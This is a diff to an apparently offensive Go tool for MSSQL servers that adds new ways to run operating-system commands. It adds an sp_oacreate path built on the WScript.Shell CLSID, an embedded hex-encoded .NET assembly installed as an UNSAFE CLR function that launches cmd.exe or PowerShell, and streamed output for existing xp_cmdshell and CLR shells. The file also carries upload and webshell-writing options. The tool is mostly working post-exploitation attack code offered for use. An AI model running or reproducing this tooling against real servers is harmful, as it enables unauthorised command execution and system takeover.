@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"database/sql"
 	"encoding/hex"
 	"fmt"
@@ -9,6 +10,7 @@ import (
 	"os"
 	"time"
 
+	"github.com/golang-sql/sqlexp"
 	"github.com/google/uuid"
 
 	// "flag"
@@ -25,9 +27,11 @@ var (
 	database          string
 	port              int
 	query             string
+	option            string
 	cmd               string
 	cmd1              string
 	cmd2              string
+	cmdsp             string
 	cmd3              string
 	cmdpy             string
 	cmd4              string
@@ -37,6 +41,7 @@ var (
 	cmd8              string
 	cmd9              string
 	cmd10             string
+	cmd11             string
 	dir               string
 	debug             bool
 	enable            bool
@@ -55,6 +60,8 @@ var (
 	uninstall_clrcmd  bool
 	install_clrcmd1   bool
 	uninstall_clrcmd1 bool
+	install_clrcmd2   bool
+	uninstall_clrcmd2 bool
 	path              string
 	code              string
 	downurl           string
@@ -112,6 +119,12 @@ func main() {
 			Destination: &port,
 		},
 		&cli.StringFlag{
+			Name:        "option",
+			Value:       "whoami",
+			Usage:       "-xcmd, -X powershell",
+			Destination: &option,
+		},
+		&cli.StringFlag{
 			Name:        "query,q,sql",
 			Value:       "select @@version",
 			Usage:       "SQL query",
@@ -133,9 +146,16 @@ func main() {
 		&cli.StringFlag{
 			Name:        "cmd2,c2",
 			Value:       "whoami",
-			Usage:       "Exec System Command | sp_oacreate有回显执行",
+			Usage:       "Exec System Command | sp_oacreate有回显执行 | wscript.shell",
 			Destination: &cmd2,
 		},
+		&cli.StringFlag{
+			Name:        "cmdsp",
+			Value:       "whoami",
+			Usage:       "Exec System Command | sp_oacreate有回显执行 | {72C24DD5-D70A-438B-8A42-98424B88AFB8}",
+			Destination: &cmdsp,
+		},
+
 		&cli.StringFlag{
 			Name:        "cmd3,c3",
 			Value:       "clr_exec whoami",
@@ -189,6 +209,12 @@ func main() {
 			Value:       "-c10 whoami >c:\\windows\\temp\\123.txt",
 			Usage:       "Exec System Command | createAndStartJob command",
 			Destination: &cmd10,
+		},
+		&cli.StringFlag{
+			Name:        "cmd11,c11",
+			Value:       "--option -x --cmd11 cmd",
+			Usage:       "Exec System Command | 自写clr执行 | --option -x --cmd11 cmd | --option -X --cmd11 powershell",
+			Destination: &cmd11,
 		},
 		&cli.StringFlag{
 			Name:        "dir,dirtree",
@@ -313,6 +339,16 @@ func main() {
 			Destination: &uninstall_clrcmd1,
 		},
 		&cli.BoolFlag{
+			Name:        "install_clrcmd2,in_clrcmd2",
+			Usage:       "install clrcmd2 | --cmd11 \"whoami\"",
+			Destination: &install_clrcmd1,
+		},
+		&cli.BoolFlag{
+			Name:        "uninstall_clrcmd2,un_clrcmd2",
+			Usage:       "uninstall clrcmd2 | --cmd11 \"whoami\"",
+			Destination: &uninstall_clrcmd2,
+		},
+		&cli.BoolFlag{
 			Name:        "upload",
 			Usage:       "--upload --local c:\\svchost.exe --remote C:\\Windows\\Temp\\svchost.exe",
 			Destination: &upload,
@@ -335,6 +371,9 @@ func main() {
 		if c.IsSet("port") {
 			port = c.Int("port")
 		}
+		if c.IsSet("option") {
+			option = c.String("option")
+		}
 		if c.IsSet("query") {
 			query = c.String("query")
 		}
@@ -347,11 +386,14 @@ func main() {
 		if c.IsSet("cmd2") {
 			cmd2 = c.String("cmd2")
 		}
+		if c.IsSet("cmdsp") {
+			cmdsp = c.String("cmdsp")
+		}
 		if c.IsSet("cmd3") {
 			cmd3 = c.String("cmd3")
 		}
 		if c.IsSet("cmdpy") {
-			cmd3 = c.String("cmdpy")
+			cmdpy = c.String("cmdpy")
 		}
 		if c.IsSet("cmd4") {
 			cmd4 = c.String("cmd4")
@@ -373,6 +415,9 @@ func main() {
 		}
 		if c.IsSet("cmd10") {
 			cmd10 = c.String("cmd10")
+		}
+		if c.IsSet("cmd11") {
+			cmd11 = c.String("cmd11")
 		}
 		if c.IsSet("code") {
 			code = c.String("code")
@@ -412,10 +457,12 @@ func main() {
 				fmt.Printf(" password:%s\n", password)
 				fmt.Printf(" database:%s\n", database)
 				fmt.Printf(" port:%d\n", port)
+				fmt.Printf(" Option:%s\n", option)
 				fmt.Printf(" Query:%s\n", query)
 				fmt.Printf(" Cmd:%s\n", cmd)
 				fmt.Printf(" Cmd1:%s\n", cmd1)
 				fmt.Printf(" Cmd2:%s\n", cmd2)
+				fmt.Printf(" Cmdsp:%s\n", cmdsp)
 				fmt.Printf(" Cmd3:%s\n", cmd3)
 				fmt.Printf(" Cmdpy:%s\n", cmdpy)
 				fmt.Printf(" Cmd4:%s\n", cmd4)
@@ -425,6 +472,7 @@ func main() {
 				fmt.Printf(" Cmd8:%s\n", cmd8)
 				fmt.Printf(" Cmd9:%s\n", cmd9)
 				fmt.Printf(" Cmd10:%s\n", cmd10)
+				fmt.Printf(" Cmd11:%s\n", cmd11)
 				fmt.Printf(" dir:%s\n", dir)
 				fmt.Println(" Connect:", connString)
 			}
@@ -506,6 +554,17 @@ func main() {
 				Uninstall_clrcmd1()
 			}
 		}
+		if c.IsSet("install_clrcmd2") {
+			if c.Bool("install_clrcmd2") {
+				Install_clrcmd2()
+			}
+		}
+
+		if c.IsSet("uninstall_clrcmd2") {
+			if c.Bool("uninstall_clrcmd2") {
+				Uninstall_clrcmd2()
+			}
+		}
 		if c.IsSet("upload") {
 			if c.Bool("upload") {
 				upload_files()
@@ -523,6 +582,9 @@ func main() {
 		}
 		if c.IsSet("cmd2") {
 			os_shell_sp2()
+		}
+		if c.IsSet("cmdsp") {
+			os_shell_spop1()
 		}
 		if c.IsSet("cmd3") {
 			os_shell_clr()
@@ -550,6 +612,9 @@ func main() {
 		}
 		if c.IsSet("cmd10") {
 			createAndStartJob()
+		}
+		if c.IsSet("cmd11") {
+			os_shell_clrcmd2()
 		}
 		if c.IsSet("path") {
 			write_web()
@@ -1123,6 +1188,73 @@ func Uninstall_clrcmd1() {
 	return
 
 }
+
+func Install_clrcmd2() {
+	sqlRaw := `
+	CREATE ASSEMBLY [clr_Modules] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c01030029d16a5a0000000000000000e00022200b013000000a00000006000000000000be2800000020000000400000000000100020000000020000040000000000000004000000000000000080000000020000000000000300408500001000001000000000100000100000000000001000000000000000000000006c2800004f000000004000007c03000000000000000000000000000000000000006000000c000000342700001c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000c408000000200000000a000000020000000000000000000000000000200000602e727372630000007c0300000040000000040000000c0000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001000000000000000000000000000004000004200000000000000000000000000000000a0280000000000004800000002000500c4200000700600000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133003005f00000000000000730e00000a256f0f00000a026f1000000a256f0f00000a176f1100000a256f0f00000a166f1200000a256f0f00000a176f1300000a256f0f00000a176f1400000a256f0f00000a036f1500000a256f1600000a266f1700000a6f1800000a2a1e02281900000a2a0042534a4201000100000000000c00000076322e302e35303732370000000005006c00000020020000237e00008c020000ec02000023537472696e6773000000007805000004000000235553007c0500001000000023475549440000008c050000e400000023426c6f620000000000000002000001471500000900000000fa0133001600000100000013000000020000000200000002000000190000000d00000001000000020000000000a0010100000000000600f90054020600660154020600460022020f007402000006006e00b5010600dc00b5010600bd00b50106004d01b50106001901b50106003201b50106008500b50106005a0035020600380035020600a000b50106009902a9010a00830222020a00d90122020600ea010a000600f7010a000000000001000000000001000100010010001d00b0013d00010001005020000000009600c70135000100bb200000000086181c0206000300000001009801000002009c0109001c02010011001c02060019001c020a0029001c02100031001c02100039001c02100041001c02100049001c02100051001c02100059001c02100061001c02150069001c02100071001c02100081001c0206008100cb011a0089002b0010008900d90215008900840115008900be02150089000202150089008b0210008100a0021f008100ab02230099002100280079001c0206002e000b003b002e00130044002e001b0063002e0023006c002e002b0076002e00330076002e003b007c002e0043006c002e004b008b002e00530076002e005b0076002e006300ac002e006b00d600048000000100000000000000000000000000a60200000200000000000000000000002c001400000000000200000000000000000000002c00a901000000000000003c4d6f64756c653e0053797374656d2e494f006d73636f726c696200636d640052656164546f456e64007365745f46696c654e616d6500477569644174747269627574650044656275676761626c6541747472696275746500436f6d56697369626c6541747472696275746500417373656d626c795469746c6541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c45786563757465006578650061726700746573742e646c6c0053797374656d006c75616e0053797374656d2e5265666c656374696f6e0072756e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d5265616465720054657874526561646572007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e496e7465726f7053657276696365730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730050726f63657373007365745f417267756d656e7473004f626a6563740053746172740074657374006765745f5374616e646172644f7574707574007365745f52656469726563745374616e646172644f7574707574007365745f4372656174654e6f57696e646f770000000000e388bea52dd89b46bc54e92695a9106b00042001010803200001052001011111042001010e042001010204200012450320000204200012490320000e08b77a5c561934e0890500020e0e0e0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f777301080100020000000000090100047465737400000501000000000e0100094d6963726f736f667400002001001b436f7079726967687420c2a9204d6963726f736f6674203230313800002901002434363864653931652d356661622d346431632d613639392d31323937343038343437663700000c010007312e302e302e300000000000000029d16a5a00000000020000001c010000502700005009000052534453c5a291c391233540a57b8322a05f0d8601000000443a5c615c7270635c746573745c746573745c6f626a5c52656c656173655c746573742e7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000942800000000000000000000ae280000002000000000000000000000000000000000000000000000a0280000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000200300000000000000000000200334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b00480020000010053007400720069006e006700460069006c00650049006e0066006f0000005c02000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000034000a00010043006f006d00700061006e0079004e0061006d006500000000004d006900630072006f0073006f00660074000000320005000100460069006c0065004400650073006300720069007000740069006f006e0000000000740065007300740000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e003000000032000900010049006e007400650072006e0061006c004e0061006d006500000074006500730074002e0064006c006c00000000005a001b0001004c006500670061006c0043006f007000790072006900670068007400000043006f0070007900720069006700680074002000a90020004d006900630072006f0073006f006600740020003200300031003800000000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000003a00090001004f0072006900670069006e0061006c00460069006c0065006e0061006d006500000074006500730074002e0064006c006c00000000002a0005000100500072006f0064007500630074004e0061006d00650000000000740065007300740000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000c03800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;
+	`
+	sqlRaw1 := `
+	CREATE FUNCTION dbo.Sphelps(@exe as nvarchar(MAX),@arg as nvarchar(MAX))RETURNS nvarchar(MAX) AS EXTERNAL NAME clr_Modules.[luan.cmd].run;
+	`
+
+	rows, err := conn.Query(sqlRaw)
+	if err != nil {
+		log.Fatal(err)
+	}
+	var onReturn int
+	var onMessage string
+	for rows.Next() {
+		rows.Scan(&onReturn, &onMessage)
+	}
+	rows.Close()
+
+	rows1, err := conn.Query(sqlRaw1)
+	if err != nil {
+		log.Fatal(err)
+	}
+	var onReturn1 int
+	var onMessage1 string
+	for rows1.Next() {
+		rows1.Scan(&onReturn1, &onMessage1)
+	}
+	rows1.Close()
+	fmt.Println("Clrcmd2 Install Success.")
+	return
+
+}
+
+func Uninstall_clrcmd2() {
+	value, err := conn.Prepare("select value_in_use from sys.configurations where name = 'clr enabled'")
+	if err != nil {
+		log.Fatal("Prepare failed:", err.Error())
+	}
+	defer value.Close()
+
+	row := value.QueryRow()
+	//var somenumber int64
+	var v int
+	err = row.Scan(&v)
+	if err != nil {
+		log.Fatal("Query failed:", err.Error())
+	}
+	if v == 0 {
+		fmt.Printf("clr enabled Disabled\n")
+
+	} else {
+		stmt, err := conn.Prepare("DROP FUNCTION dbo.Sphelps;DROP ASSEMBLY clr_Modules;")
+		fmt.Printf("uninstall clrcmd Success.\n")
+		if err != nil {
+			//fmt.Println("Query Error", err)
+			return
+		}
+		defer stmt.Close()
+		stmt.Query()
+
+	}
+	return
+
+}
+
 func os_shell() {
 	rows, err := conn.Query(`EXEC master.dbo.xp_cmdshell '` + cmd + `'; `)
 	//fmt.Println(rows)
@@ -1288,79 +1420,125 @@ func os_shell_sp2() {
 	}
 }
 
-func os_shell_clr() {
-
-	rows, err := conn.Query(`EXEC ClrExec ' ` + cmd3 + `'`)
+func os_shell_spop1() {
+	rows, err := conn.Query(`declare @shell int,@exec int,@text int,@str varchar(8000);exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@shell output;exec sp_oamethod @shell,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c ` + cmdsp + `';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'ReadAll', @str out;select @str;`)
 	if err != nil {
-		log.Fatal(err)
+
+		panic(err.Error())
+
 	}
 	defer rows.Close()
-	var onReturn int
-	var onMessage string
-	for rows.Next() {
-		rows.Scan(&onReturn, &onMessage)
+	columns, err := rows.Columns()
+	if err != nil {
+		panic(err.Error())
 	}
-	rows.Close()
-	log.Println(onReturn, onMessage)
+	values := make([]sql.RawBytes, len(columns))
+	scanArgs := make([]interface{}, len(values))
+	for i := range values {
+		scanArgs[i] = &values[i]
+	}
+
+	for rows.Next() {
+		err = rows.Scan(scanArgs...)
+		if err != nil {
+			panic(err.Error())
+		}
+		var value string
+		for _, col := range values {
+			if col == nil {
+				value = ""
+			} else {
+				value = string(col)
+			}
+			fmt.Println(value)
+		}
+	}
+	if err = rows.Err(); err != nil {
+		panic(err.Error()) // proper error handling instead of panic in your app
+	}
+}
+
+func os_shell_clr() {
+	retmsg := &sqlexp.ReturnMessage{}
+	ctx := context.Background()
+	msgQuery := `EXEC ClrExec '` + cmd3 + `'`
+	rows, err := conn.QueryContext(ctx, msgQuery, retmsg)
+	if err != nil {
+		log.Fatalf("QueryContext failed: %v", err)
+	}
+	active := true
+	for active {
+		msg := retmsg.Message(ctx)
+		switch m := msg.(type) {
+		case sqlexp.MsgNotice:
+			fmt.Println(m.Message)
+		case sqlexp.MsgNext:
+			inresult := true
+			for inresult {
+				inresult = rows.Next()
+				if inresult {
+					cols, err := rows.Columns()
+					if err != nil {
+						log.Fatalf("Columns failed: %v", err)
+					}
+					fmt.Println(cols)
+					var d interface{}
+					if err = rows.Scan(&d); err == nil {
+						fmt.Println(d)
+					}
+				}
+			}
+		case sqlexp.MsgNextResultSet:
+			active = rows.NextResultSet()
+		case sqlexp.MsgError:
+			fmt.Println("Error:", m.Error)
+		case sqlexp.MsgRowsAffected:
+			fmt.Println("Rows affected:", m.Count)
+		}
+	}
 
 }
 
 func os_shell_pyclr() {
-
-	rows, err := conn.Query(`EXEC sp_help_text_tables '` + cmdpy + `'`)
+	retmsg := &sqlexp.ReturnMessage{}
+	ctx := context.Background()
+	msgQuery := `EXEC sp_help_text_tables '` + cmdpy + `'`
+	rows, err := conn.QueryContext(ctx, msgQuery, retmsg)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("QueryContext failed: %v", err)
 	}
-	defer rows.Close()
-	var onReturn int
-	var onMessage string
-	for rows.Next() {
-		rows.Scan(&onReturn, &onMessage)
+	active := true
+	for active {
+		msg := retmsg.Message(ctx)
+		switch m := msg.(type) {
+		case sqlexp.MsgNotice:
+			fmt.Println(m.Message)
+		case sqlexp.MsgNext:
+			inresult := true
+			for inresult {
+				inresult = rows.Next()
+				if inresult {
+					cols, err := rows.Columns()
+					if err != nil {
+						log.Fatalf("Columns failed: %v", err)
+					}
+					fmt.Println(cols)
+					var d interface{}
+					if err = rows.Scan(&d); err == nil {
+						fmt.Println(d)
+					}
+				}
+			}
+		case sqlexp.MsgNextResultSet:
+			active = rows.NextResultSet()
+		case sqlexp.MsgError:
+			fmt.Println("Error:", m.Error)
+		case sqlexp.MsgRowsAffected:
+			fmt.Println("Rows affected:", m.Count)
+		}
 	}
-	rows.Close()
-	log.Println(onReturn, onMessage)
 
 }
-
-// func os_shell_clr() {
-// 	rows, err := conn.Query(`EXEC ClrExec '` + cmd3 + `'`)
-// 	if err != nil {
-// 		panic(err.Error())
-// 	}
-// 	defer rows.Close()
-
-// 	columns, err := rows.Columns()
-// 	if err != nil {
-// 		panic(err.Error())
-// 	}
-// 	values := make([]sql.RawBytes, len(columns))
-// 	scanArgs := make([]interface{}, len(values))
-// 	for i := range values {
-// 		scanArgs[i] = &values[i]
-// 	}
-
-// 	for rows.Next() {
-// 		err = rows.Scan(scanArgs...)
-// 		if err != nil {
-// 			panic(err.Error())
-// 		}
-// 		var value string
-// 		for _, col := range values {
-// 			if col == nil {
-// 				value = ""
-// 			} else {
-// 				value = string(col)
-// 				fmt.Println(value)
-// 			}
-
-// 		}
-
-// 	}
-// 	if err = rows.Err(); err != nil {
-// 		fmt.Println("Query Error", err)
-// 		panic(err.Error()) // proper error handling instead of panic in your app
-// 	}
-// }
 
 func os_shell_clrcmd() {
 	rows, err := conn.Query(`select ` + database + `.dbo.sysinfo_run('` + cmd4 + `','` + cmd5 + `')`)
@@ -1405,44 +1583,89 @@ func os_shell_clrcmd() {
 }
 
 func os_shell_clrcmd1() {
-	rows, err := conn.Query(`EXEC ExecCommand '` + cmd7 + `'`)
+	retmsg := &sqlexp.ReturnMessage{}
+	ctx := context.Background()
+	msgQuery := `exec ExecCommand '` + cmd7 + `';`
+	rows, err := conn.QueryContext(ctx, msgQuery, retmsg)
 	if err != nil {
-
-		panic(err.Error())
-
+		log.Fatalf("QueryContext failed: %v", err)
 	}
-	defer rows.Close()
-
-	columns, err := rows.Columns()
-	if err != nil {
-		panic(err.Error())
-	}
-	values := make([]sql.RawBytes, len(columns))
-	scanArgs := make([]interface{}, len(values))
-	for i := range values {
-		scanArgs[i] = &values[i]
-	}
-
-	for rows.Next() {
-		err = rows.Scan(scanArgs...)
-		if err != nil {
-			panic(err.Error())
-		}
-		var value string
-		for _, col := range values {
-			if col == nil {
-				value = ""
-			} else {
-				value = string(col)
-				// fmt.Println(value)
+	active := true
+	for active {
+		msg := retmsg.Message(ctx)
+		switch m := msg.(type) {
+		case sqlexp.MsgNotice:
+			fmt.Println(m.Message)
+		case sqlexp.MsgNext:
+			inresult := true
+			for inresult {
+				inresult = rows.Next()
+				if inresult {
+					cols, err := rows.Columns()
+					if err != nil {
+						log.Fatalf("Columns failed: %v", err)
+					}
+					fmt.Println(cols)
+					var d interface{}
+					if err = rows.Scan(&d); err == nil {
+						fmt.Println(d)
+					}
+				}
 			}
-			fmt.Println(value)
-
+		case sqlexp.MsgNextResultSet:
+			active = rows.NextResultSet()
+		case sqlexp.MsgError:
+			fmt.Println("Error:", m.Error)
+		case sqlexp.MsgRowsAffected:
+			fmt.Println("Rows affected:", m.Count)
 		}
-
 	}
-	if err = rows.Err(); err != nil {
-		panic(err.Error()) // proper error handling instead of panic in your app
+}
+func os_shell_clrcmd2() {
+	retmsg := &sqlexp.ReturnMessage{}
+	ctx := context.Background()
+	var shell string
+	if option == "-X" {
+		shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+	} else if option == "-x" {
+		shell = "C:\\Windows\\System32\\cmd.exe"
+	}
+	msgQuery := fmt.Sprintf(`SELECT dbo.Sphelps('%s', '/c `+cmd11+`')`, shell)
+	// msgQuery := `SELECT dbo.Sphelps('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', '/c ` + cmd11 + `')`
+	// msgQuery := `SELECT dbo.Sphelps('C:\Windows\System32\cmd.exe', '/c ` + cmd11 + `')`
+	rows, err := conn.QueryContext(ctx, msgQuery, retmsg)
+	if err != nil {
+		log.Fatalf("QueryContext failed: %v", err)
+	}
+	active := true
+	for active {
+		msg := retmsg.Message(ctx)
+		switch m := msg.(type) {
+		case sqlexp.MsgNotice:
+			fmt.Println(m.Message)
+		case sqlexp.MsgNext:
+			inresult := true
+			for inresult {
+				inresult = rows.Next()
+				if inresult {
+					cols, err := rows.Columns()
+					if err != nil {
+						log.Fatalf("Columns failed: %v", err)
+					}
+					fmt.Println(cols)
+					var d interface{}
+					if err = rows.Scan(&d); err == nil {
+						fmt.Println(d)
+					}
+				}
+			}
+		case sqlexp.MsgNextResultSet:
+			active = rows.NextResultSet()
+		case sqlexp.MsgError:
+			fmt.Println("Error:", m.Error)
+			// case sqlexp.MsgRowsAffected:
+			// 	fmt.Println("Rows affected:", m.Count)
+		}
 	}
 }
 
